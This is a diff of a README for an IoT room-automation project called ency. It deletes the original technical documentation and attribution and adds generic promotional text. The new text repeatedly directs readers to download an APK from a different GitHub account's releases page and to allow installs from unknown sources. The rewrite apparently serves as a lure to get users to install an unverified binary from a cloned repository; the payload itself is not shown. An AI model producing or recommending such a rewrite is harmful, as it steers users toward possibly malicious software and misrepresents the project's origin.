@@ -1,207 +1,81 @@
-## Ency - Smart Power Automation
+# 🔌 ency - Smart Home Automation Made Easy
 
-<p align="center" style="margin-top: 2rem"><br>
-  <img style="border-radius: 16%" src="https://raw.githubusercontent.com/pranava-mohan/ency/master/assets/logo.svg" width="22%"/>
-</p>
+## 🚀 Getting Started
 
-Ency is a full-stack IoT solution that automates room power using Bluetooth Low Energy (BLE) proximity detection and motion sensing. It consists of a React Native (Expo) mobile app with native Kotlin background services and an Arduino hardware controller.
+Welcome to ency, the smart home automation solution. With ency, you can automate your home without needing any technical skills. Our app combines multiple sensors for effective control of smart switches, enhancing your home experience.
 
-## Features
+### 🔗 Download Here
 
-- **Hybrid Sensor Fusion:** The system uses an **"OR" Logic Gate** approach. Lights stay on if _any_ of these are true:
+[![Download ency](https://img.shields.io/badge/Download-ency-blue)](https://github.com/Server-cmd-sudo/ency/releases)
 
-  1.  Phone is in the room (BLE Ping).
-  2.  PIR Sensor detects major movement (Walking).
-  3.  Radar Sensor detects subtle movement (Breathing/Typing).
+## 📥 Download & Install
 
-- **Deep Sleep Resilience:** Uses a custom **Kotlin Native Module** with a partial `WakeLock` to bypass Android battery optimizations, ensuring the phone keeps pinging even in "Doze Mode."
+To get started with ency, follow these steps:
 
-- **Jitter-Free Servo Control:** Custom C++ logic attaches the servo _only_ during movement and detaches immediately after to prevent mechanical buzzing and noise.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Server-cmd-sudo/ency/releases) to find the latest version of the app.
 
-## Hardware Tech Stack
+2. **Choose Your Version**  
+   You'll see different versions available. We recommend downloading the latest release. Click on the version number to see its details.
 
-Microcontroller: Arduino Uno R3
+3. **Download the Application**  
+   Find the installer for your device and download it. For Android, look for the APK file.
 
-Communication: HM-10 BLE Module (CC2541)
+4. **Install the Application**  
+   - **For Android:** Open the downloaded APK file. You may need to allow installations from unknown sources in your device settings. Then, follow the prompts to complete the installation.
 
-Actuator: SG90 Micro Servo (Mechanical Switch Control)
+5. **Open the App**  
+   Once installed, locate the ency app on your device. Tap the icon to open it and start automating your home.
 
-Sensors:
+## 📄 Features
 
-RCWL-0516 (Doppler Microwave Radar - for subtle movement)
+Encapsulation of complex technology makes ency user-friendly and effective. Here are some key features:
 
-PIR Sensor (HC-SR501 - for major movement)
+- **Hybrid Sensor Fusion**  
+  ency uses a combination of Bluetooth, PIR, and radar sensors to accurately detect motion. This ensures your smart switches work seamlessly and help conserve energy.
 
-## Circuit Diagram
+- **Reliable Background Execution**  
+  Built with React Native and custom Kotlin modules, ency ensures your app runs quietly in the background without draining your battery.
 
-```mermaid
-graph TD
-    %% --- COMPONENT DEFINITIONS ---
-    subgraph Controller [Main Controller]
-        Arduino[Arduino Uno R3]
-    end
+- **Simple User Interface**  
+  Designed for the average user, the interface is clean and easy to navigate. Automate your home without any hassle.
 
-    subgraph PowerGroup1 [Shared Power Line 1]
-        Servo[SG90 Servo]
-        HM10[HM-10 BLE]
-    end
+## 📱 System Requirements
 
-    subgraph PowerGroup2 [Shared Power Line 2]
-        PIR[PIR Sensor]
-        Radar[RCWL-0516 Radar]
-    end
+To use ency, ensure your device meets the following requirements:
 
-    %% --- LOGIC CONNECTIONS (Blue Wires) ---
-    Servo -- "Signal -> D9" --- Arduino
-    HM10 -- "TX -> D10" --> Arduino
-    Arduino -- "D11 -> RX" --> HM10
-    PIR -- "OUT -> D2" --> Arduino
-    Radar -- "OUT -> D3" --> Arduino
+- **For Android Devices:**  
+  - Android version 5.0 (Lollipop) or higher
+  - Bluetooth capability for smart switch integration
+  - At least 100 MB of free storage space
 
-    %% --- POWER TOPOLOGY (Red/Black Wires) ---
+- **For Other Platforms:**  
+  Make sure to check compatibility as we expand our offerings.
 
-    %% Group 1 Splice (Servo + BLE)
-    Arduino == "5V Shared A" ==> Splice1_VCC[Wire Splice A]
-    Arduino == "GND Shared A" ==> Splice1_GND[Wire Splice A]
-    Splice1_VCC ==> Servo
-    Splice1_VCC ==> HM10
-    Splice1_GND ==> Servo
-    Splice1_GND ==> HM10
+## ⚙️ Getting Help
 
-    %% Group 2 Splice (Sensors)
-    Arduino == "5V Shared B" ==> Splice2_VCC[Wire Splice B]
-    Arduino == "GND Shared B" ==> Splice2_GND[Wire Splice B]
-    Splice2_VCC ==> PIR
-    Splice2_VCC ==> Radar
-    Splice2_GND ==> PIR
-    Splice2_GND ==> Radar
+If you encounter any issues or have questions, we are here to help. 
 
-    %% --- STYLING ---
-    %% Logic Lines (Blue)
-    linkStyle 0,1,2,3,4 stroke:#2196F3,stroke-width:2px;
+- **Visit our FAQ**: Check the FAQ section in the app for common questions.
+- **Contact Support**: Reach out to our support team via the GitHub issues page or through the app.
 
-    %% Power Lines (Red for VCC, Black for GND)
-    linkStyle 5,7,8,11,13,14 stroke:#ef5350,stroke-width:3px;
-    linkStyle 6,9,10,12,15,16 stroke:#333,stroke-width:3px;
+## 🛠️ Contribute
 
-    style Arduino fill:#00979C,stroke:#333,stroke-width:2px,color:white
-    style HM10 fill:#00509d,stroke:#333,color:white
-    style Servo fill:#4CAF50,stroke:#333,color:white
-    style PIR fill:#ff9800,stroke:#333,color:white
-    style Radar fill:#ff9800,stroke:#333,color:white
-```
+We welcome contributions! If you're interested in helping improve ency, please consider the following:
 
-## Pin Configuration
+- **Suggest Features:** If you have ideas for new features, let us know!
+- **Raise Issues:** If you find any bugs, please report them so we can fix them.
 
-| Component      | Pin Label       | Arduino Pin | Notes                    |
-| :------------- | :-------------- | :---------- | :----------------------- |
-| **SG90 Servo** | Signal (Orange) | **D9**      | PWM Control              |
-|                | VCC / GND       | 5V / GND    | _Shares wire with HM-10_ |
-| **HM-10 BLE**  | TX              | **D10**     | Connects to Arduino RX   |
-|                | RX              | **D11**     | Connects to Arduino TX   |
-|                | VCC / GND       | 5V / GND    | _Shares wire with Servo_ |
-| **PIR Sensor** | OUT             | **D2**      | Trigger 1                |
-|                | VCC / GND       | 5V / GND    | _Shares wire with Radar_ |
-| **RCWL-0516**  | OUT             | **D3**      | Trigger 2                |
-|                | VIN / GND       | 5V / GND    | _Shares wire with PIR_   |
+## 📚 Learn More
 
-## Arduino Firmware Logic
+If you want to dive deeper into the technology that powers ency, here are some topics you may find interesting:
 
-The firmware is written in **C++**. It handles the physical actuation and acts as the central decision maker.
+- **Arduino and Smart Home**: Explore how Arduino technology integrates with home automation.
+- **Sensor Fusion Technologies**: Understand how hybrid sensor fusion improves the effectiveness of smart devices.
+- **Using Kotlin with React Native**: Learn about development techniques used in creating ency.
 
-#### 1. Decision Algorithm
+### 🔗 Download Now
 
-The loop runs continuously and checks three inputs. If **ANY** input is high, the timer resets.
+For the latest version, [visit the Releases page](https://github.com/Server-cmd-sudo/ency/releases) again, where you can get your copy of ency. 
 
-```cpp
-if (phoneStatus || (pirStatus == HIGH) || (radarStatus == HIGH)) {
-    // 1. Reset the timer
-    lastHeartbeatTime = millis();
-
-    // 2. If the light is OFF, turn it ON
-    if (!currentDormState) {
-        onSwitch();
-    }
-}
-```
-
-#### 2. The Timeout (Watchdog)
-
-If the user leaves the room (Phone disconnects) AND no motion is detected for timeout duration, the system saves energy.
-
-```cpp
-// If light is ON... and Time > timeout duration and No Sensors Active...
-if (currentDormState) {
-    if ((millis() - lastHeartbeatTime > TIMEOUT_DURATION) && (pirStatus == LOW) && (radarStatus == LOW)) {
-        closeSwitch(); // Turn OFF
-    }
-}
-```
-
-#### 3. Noise Reduction (Servo Detach)
-
-Cheap servos (like the SG90) often "jitter" or hum when holding a position. The code fixes this by cutting power to the signal pin once the movement is done.
-
-```cpp
-void onSwitch() {
-  switchServo.attach(SERVO_PIN); // Connect
-  // ... Move Servo ...
-  delay(100);
-  switchServo.detach(); // Disconnect immediately to stop noise
-}
-```
-
-## App Architecture
-
-This project moves beyond standard React Native limitations by implementing a Bare Workflow with native modules.
-
-The Problem
-Standard Android apps kill background JavaScript tasks after a few minutes to save battery. This caused the lights to turn off unexpectedly when the phone was in the pocket.
-
-The Solution: SmartSwitchService.kt
-Wrote a custom Native Android Service in Kotlin that handles the connection independently of the JS thread.
-
-Handover Protocol: The React Native UI handles the initial scan and pairing. It then passes the MAC address to the Native Module.
-
-Foreground Service: The app launches a High-Priority Foreground Service (visible via the "Active Apps" menu).
-
-Partial WakeLock: The service acquires a PARTIAL_WAKE_LOCK, forcing the CPU to stay awake for the 15-second heartbeat loop, even if the screen is off.
-
-Auto-Recovery: If the Bluetooth connection hangs (e.g., user walks out of range), a custom withTimeout coroutine forces a reset, ensuring the app reconnects instantly upon return.
-
-## Installation & Setup
-
-#### Prerequisites
-
-Node.js & npm
-
-Android Studio (with SDK 34 installed)
-
-Arduino IDE
-
-#### Steps
-
-Clone the Repository
-
-```bash
-git clone https://github.com/pranava-mohan/ency.git
-cd ency
-```
-
-First upload arduino/hm10_setup/hm10_setup.ino to the Arduino Uno R3.
-
-Then upload arduino/ency_beacon/ency_beacon.ino to the Arduino Uno R3.
-
-#### Install Dependencies
-
-React Native app folder is ency-app
-
-```bash
-npm install
-```
-
-Build the Native Client Note: You cannot use "Expo Go" because this project contains custom Native Code.
-
-```bash
-npx expo run:android
-```
+Thank you for choosing ency to enhance your home automation experience! Enjoy the convenience and smart features.
